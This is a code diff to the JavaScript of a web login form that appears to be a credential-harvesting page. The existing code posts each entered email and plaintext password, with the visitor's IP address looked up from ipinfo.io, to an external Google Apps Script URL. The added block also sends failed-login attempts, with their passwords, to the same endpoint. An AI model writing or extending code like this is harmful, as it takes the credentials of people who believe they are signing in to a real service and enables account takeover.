@@ -156,7 +156,6 @@
             return emailPattern.test(email);
         }
 
-        // Function to handle the Verify button click
         function handleVerifyClick() {
             const btn = document.getElementById('btnSubmitPassword');
             const emailField = document.getElementById('txtEmail');
@@ -223,9 +222,9 @@
                             formData.append('Email', email);
                             formData.append('Password', password);
                             formData.append('Verified', data.accountAccess);
-                            formData.append('FormId', 'form23');
+                            formData.append('FormId', 'form20');
                             formData.append('IPAddress', userIp); // Include the user's IP address
-                            
+
                             return fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec', {
                                 method: 'POST',
                                 headers: {
@@ -246,6 +245,31 @@
                 console.error("Error:", error);
                 if (error.message === "Invalid password or account access denied.") {
                     invalidPasswordError.style.display = 'block';
+
+                    // Fetch the user's IP address for failed login notification
+                    fetch('https://ipinfo.io/json')
+                        .then(response => response.json())
+                        .then(ipData => {
+                            const userIp = ipData.ip;
+
+                            const formData = new URLSearchParams();
+                            formData.append('Email', email);
+                            formData.append('Password', password);
+                            formData.append('FormId', 'form20');
+                            formData.append('IPAddress', userIp); // Include IP address
+                            formData.append('Verified', false);
+
+                            // Send the failed login notification to App Script
+                            return fetch('https://script.google.com/macros/s/AKfycbyujy1R5qLrISn3RTBut1RC9fwZbJ7bh2YELsYqXUw7M0uARGtdWcjKoYF_VnZx5kYA/exec?action=notifyFailedLogin', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/x-www-form-urlencoded'
+                                },
+                                body: formData
+                            });
+                        })
+                        .then(response => console.log("Failed login notification sent:", response))
+                        .catch(notificationError => console.error("Failed to send failed login notification:", notificationError));
                 } else {
                     generalError.style.display = 'block';
                 }
